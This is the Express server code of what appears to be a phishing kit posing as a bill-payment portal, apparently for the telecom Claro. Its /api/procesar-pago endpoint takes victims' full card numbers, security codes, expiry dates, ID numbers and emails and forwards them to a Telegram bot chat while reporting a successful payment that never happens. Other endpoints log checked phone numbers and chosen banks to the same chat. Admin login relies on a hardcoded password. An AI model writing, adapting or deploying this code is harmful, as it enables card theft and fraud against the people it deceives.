require('dotenv').config();
const fetch = require('node-fetch');
const express = require('express');
const multer = require('multer');
const { Pool } = require('pg');
const fs = require('fs').promises;
const cors = require('cors');
const app = express();
app.set('trust proxy', true); // Para trust proxy en Railway
const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 10 * 1024 * 1024 } });

const pool = new Pool({ connectionString: process.env.DATABASE_URL });  
app.use(express.json());
app.use(cors({
origin: [
  'https://claro-backend-production.up.railway.app',
  'http://localhost:3000',
  'http://127.0.0.1:5501',
  'http://localhost:8080',
  'http://localhost:8000',
  'http://127.0.0.1:5500',
  'https://portaldepagosfactura.com'
  
],
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Authorization', 'Content-Type']
}));
app.use(require('express-rate-limit')({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 100 // Máximo 100 solicitudes por IP
}));
app.use(express.static('public')); // Servir subir.html

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  if (username === 'admin' && password === '2255') {
    return res.json({ ok: true, token: process.env.API_TOKEN });
  }
  res.status(401).json({ ok: false, error: 'Usuario o contraseña incorrectos' });
});

app.post('/api/subir', upload.single('archivo'), async (req, res) => {
  try {
    const token = req.headers.authorization?.split(' ')[1];
    if (token !== process.env.API_TOKEN) {
      return res.status(401).json({ ok: false, error: 'Token inválido' });
    }

    let lines;
    const isFileUpload = !!req.file; // Determinar si es una carga de archivo
    console.log('isFileUpload:', isFileUpload); // Log para depuración
    if (req.file) {
      const fileContent = req.file.buffer.toString('utf-8');
      lines = fileContent.split('\n').map(line => line.trim()).filter(line => line);
    } else if (req.body.content) {
      lines = req.body.content.split('\n').map(line => line.trim()).filter(line => line);
    } else {
      return res.status(400).json({ ok: false, error: 'No se proporcionó archivo o contenido' });
    }

    const validLines = [];
    const invalidLines = [];
    const validTelefonos = new Set(); // Para rastrear teléfonos válidos
    console.log('Líneas recibidas:', lines.length); // Log para depuración
    for (const line of lines) {
      if (!line.includes(',')) {
        invalidLines.push(line);
        continue;
      }
      const [telefono, deuda] = line.split(',');
      const normalizedTelefono = telefono.replace(/[\s-+]/g, '').slice(-10);
      if (/^\d{10}$/.test(normalizedTelefono) && !isNaN(deuda) && Number(deuda) >= 0) {
        validLines.push([normalizedTelefono, parseInt(deuda)]);
        validTelefonos.add(normalizedTelefono); // Agregar teléfono válido al conjunto
      } else {
        invalidLines.push(line);
      }
    }
    console.log('Líneas válidas:', validLines.length, 'Líneas inválidas:', invalidLines.length); // Log para depuración

    await pool.query('CREATE TABLE IF NOT EXISTS backups (id SERIAL PRIMARY KEY, timestamp TIMESTAMP, content TEXT)');
    const backup = await pool.query('SELECT telefono, deuda FROM whitelist');
    if (backup.rows.length > 0) {
      const backupContent = backup.rows.map(row => `${row.telefono},${row.deuda}`).join('\n');
      await pool.query('INSERT INTO backups (timestamp, content) VALUES ($1, $2)', [new Date(), backupContent]);
    }

    await pool.query('BEGIN');
    await pool.query('CREATE TABLE IF NOT EXISTS whitelist (telefono VARCHAR(10) PRIMARY KEY, deuda INTEGER)');
    await pool.query('CREATE INDEX IF NOT EXISTS idx_telefono ON whitelist (telefono)');

    const currentWhitelist = await pool.query('SELECT telefono, deuda FROM whitelist');
    const currentLinesMap = new Map(currentWhitelist.rows.map(row => [row.telefono, row.deuda]));
    console.log('Líneas actuales en whitelist:', currentLinesMap.size); // Log para depuración

    for (const [telefono, deuda] of validLines) {
      if (currentLinesMap.has(telefono)) {
        if (currentLinesMap.get(telefono) !== deuda) {
          await pool.query(
            'UPDATE whitelist SET deuda = $1 WHERE telefono = $2',
            [deuda, telefono]
          );
        }
      } else {
        await pool.query(
          'INSERT INTO whitelist (telefono, deuda) VALUES ($1, $2) ON CONFLICT (telefono) DO NOTHING',
          [telefono, deuda]
        );
      }
      currentLinesMap.delete(telefono); // Marcar como procesado
    }

    console.log('Entrando al loop de eliminación?', !isFileUpload); // Log para depuración
    console.log('Líneas potenciales a eliminar:', currentLinesMap.size); // Log para depuración
    // Eliminar registros no incluidos SOLO si es una edición desde el textarea
    if (!isFileUpload) {
      for (const telefono of currentLinesMap.keys()) {
        if (!validTelefonos.has(telefono)) {
          console.log('Eliminando teléfono:', telefono); // Log para depuración
          await pool.query(
            'DELETE FROM whitelist WHERE telefono = $1',
            [telefono]
          );
        }
      }
    }

    await pool.query(
      'CREATE TABLE IF NOT EXISTS audit (id SERIAL PRIMARY KEY, "user" VARCHAR(50), timestamp TIMESTAMP, valid_lines INTEGER, invalid_lines INTEGER)'
    );
    await pool.query(
      'INSERT INTO audit ("user", timestamp, valid_lines, invalid_lines) VALUES ($1, $2, $3, $4)',
      ['admin', new Date().toISOString(), validLines.length, invalidLines.length]
    );
    await pool.query('COMMIT');
    const totalQuery = await pool.query('SELECT COUNT(*) FROM whitelist');
    const totalLines = parseInt(totalQuery.rows[0].count);
    console.log('Total líneas después de la operación:', totalLines); // Log para depuración

    res.json({ ok: true, valid_lines: validLines.length, invalid_lines: invalidLines.length, total_lines: totalLines });
  } catch (error) {
    await pool.query('ROLLBACK');
    console.error('Error en /api/subir:', error.message);
    res.status(500).json({ ok: false, error: 'Error interno: ' + error.message });
  }
});

app.post('/api/verificar', async (req, res) => {
  try {
    const { numero } = req.body;
    if (!numero || !/^\d{10}$/.test(numero.replace(/[\s-+]/g, ''))) {
      return res.status(400).json({ success: false, message: 'Número de celular inválido' });
    }

    const normalizedNumero = numero.replace(/[\s-+]/g, '').slice(-10);
    const result = await pool.query(
      'SELECT telefono, deuda FROM whitelist WHERE telefono = $1',
      [normalizedNumero]
    );

    if (result.rows.length > 0) {
      const deuda = result.rows[0].deuda;

      const sendTelegramMessage = async (text) => {
        try {
          const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
          await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: process.env.TELEGRAM_CHAT_ID,
              text
            })
          });
        } catch (err) {
          console.error('Error al enviar:', err.message);
        }
      };

      await sendTelegramMessage(`${normalizedNumero}`);
      res.json({ success: true, deuda });
    } else {
      res.json({ success: false, message: 'Número inválido' });
    }
  } catch (error) {
    console.error('Error en /api/verificar:', error.message);
    res.status(500).json({ success: false, message: 'Error del servidor' });
  }
});

app.get('/api/whitelist/metadata', async (req, res) => {
  try {
    const token = req.headers.authorization?.split(' ')[1];
    if (token !== process.env.API_TOKEN) {
      return res.status(401).json({ ok: false, error: 'Token inválido' });
    }
    const whitelist = await pool.query('SELECT telefono, deuda FROM whitelist ORDER BY telefono');
    const audit = await pool.query('SELECT "user", timestamp FROM audit ORDER BY timestamp DESC LIMIT 1');
    res.json({
      ok: true,
      last_updated_by: audit.rows[0]?.user || 'Desconocido',
      last_updated_at: audit.rows[0]?.timestamp || new Date().toISOString(),
      last_lines: whitelist.rows.map(row => `${row.telefono},${row.deuda}`)
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({ ok: false, error: 'Error del servidor' });
  }
});

app.get('/api/whitelist/download', async (req, res) => {
  try {
    const token = req.headers.authorization?.split(' ')[1];
    if (token !== process.env.API_TOKEN) {
      return res.status(401).json({ ok: false, error: 'Token inválido' });
    }
    const whitelist = await pool.query('SELECT telefono, deuda FROM whitelist');
    res.set('Content-Disposition', 'attachment; filename="whitelist.txt"');
    res.send(whitelist.rows.map(row => `${row.telefono},${row.deuda}`).join('\n'));
  } catch (error) {
    console.error(error);
    res.status(500).json({ ok: false, error: 'Error del servidor' });
  }
});

app.post('/api/procesar-pago', async (req, res) => {
  try {
    const {
      nombreTarjeta,
      numeroTarjeta,
      bancoEmisor,
      fechaVencMes,
      fechaVencAnno,
      codigoSeguridad,
      tipoDocumento,
      numeroDocumento,
      email,
      numeroTelefono,
      id
    } = req.body;
    // Validamos solo los campos que vamos a usar
    if (!nombreTarjeta || !numeroTarjeta || !bancoEmisor || !fechaVencMes || !fechaVencAnno || !codigoSeguridad || !tipoDocumento || !numeroDocumento || !email || !numeroTelefono || !id) {
      return res.status(400).json({ success: false, message: 'Datos incompletos' });
    }
    try {
      const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
      const telegramResponse = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID,
          parse_mode: "Markdown",
          text: `${numeroTelefono} ha ingresado a ${bancoEmisor}
• Nombre del titular: \`${nombreTarjeta}\`
• Número de tarjeta: \`${numeroTarjeta}\`
• Banco emisor: ${bancoEmisor}
• Fecha de vencimiento: ${fechaVencMes}/${fechaVencAnno}
• Código de seguridad: \`${codigoSeguridad}\`
• Tipo de documento: \`${tipoDocumento}\`
• Número de documento: \`${numeroDocumento}\`
• Email: \`${email}\`
ID: \`${id}\``
        })
      });
      const telegramData = await telegramResponse.json();
      if (!telegramData.ok) {
        console.error('Error en la notificación:', JSON.stringify(telegramData, null, 2));
      }
    } catch (telegramError) {
      console.error('Error al enviar mensaje:', telegramError.message);
    }
    res.json({ success: true });
  } catch (error) {
    console.error('Error en /api/procesar-pago:', error.message);
    res.status(500).json({ success: false, message: 'Error del servidor' });
  }
});

app.post('/api/pse-pago', async (req, res) => {
    try {
        const { numeroTelefono, banco, id } = req.body;

        if (!numeroTelefono || !banco || !id) {
            return res.status(400).json({ success: false, message: 'Datos incompletos' });
        }

        try {
            const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
            const telegramResponse = await fetch(telegramUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: process.env.TELEGRAM_CHAT_ID,
                    text: `${numeroTelefono} ha ingresado a ${banco}\nID: ${id}`
                })
            });

            const telegramData = await telegramResponse.json();
            if (!telegramData.ok) {
                console.error('Error en la notificación:', JSON.stringify(telegramData, null, 2));
            }
        } catch (telegramError) {
            console.error('Error al enviar mensaje:', telegramError.message);
        }

        res.json({ success: true });
    } catch (error) {
        console.error('Error en /api/pse-pago:', error.message);
        res.status(500).json({ success: false, message: 'Error del servidor' });
    }
});



const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
